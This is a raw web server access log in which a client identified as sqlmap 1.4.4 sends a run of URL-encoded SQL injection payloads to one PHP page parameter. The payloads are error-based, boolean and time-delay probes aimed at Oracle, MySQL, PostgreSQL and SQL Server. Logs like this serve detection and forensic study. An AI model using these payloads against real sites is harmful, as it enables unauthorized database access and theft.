37.166.187.109 - - [22/Apr/2020:13:55:42 +0000] "GET /index.php?page=%27%20AND%202319%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282319%3D2319%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27qrYY%27%3D%27qrYY HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:42 +0000] "GET /index.php?page=%20AND%202319%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%282319%3D2319%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%2898%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20eUFf HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:42 +0000] "GET /index.php?page=%28SELECT%206419%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7171626a71%2C%28SELECT%20%28ELT%286419%3D6419%2C1%29%29%29%2C0x7170626b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29 HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:42 +0000] "GET /index.php?page=%28SELECT%20CONCAT%28CONCAT%28%27qqbjq%27%2C%28CASE%20WHEN%20%282163%3D2163%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2C%27qpbkq%27%29%29 HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:42 +0000] "GET /index.php?page=%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:42 +0000] "GET /index.php?page=%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:42 +0000] "GET /index.php?page=%27%29%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:43 +0000] "GET /index.php?page=%27%3BSELECT%20PG_SLEEP%285%29-- HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:43 +0000] "GET /index.php?page=%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:43 +0000] "GET /index.php?page=%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:43 +0000] "GET /index.php?page=%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:43 +0000] "GET /index.php?page=%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27-- HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
37.166.187.109 - - [22/Apr/2020:13:55:43 +0000] "GET /index.php?page=%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28118%29%7C%7CCHR%28106%29%7C%7CCHR%2882%29%7C%7CCHR%28105%29%2C5%29%20FROM%20DUAL-- HTTP/1.1" 200 581 "-" "sqlmap/1.4.4#stable (http://sqlmap.org)"
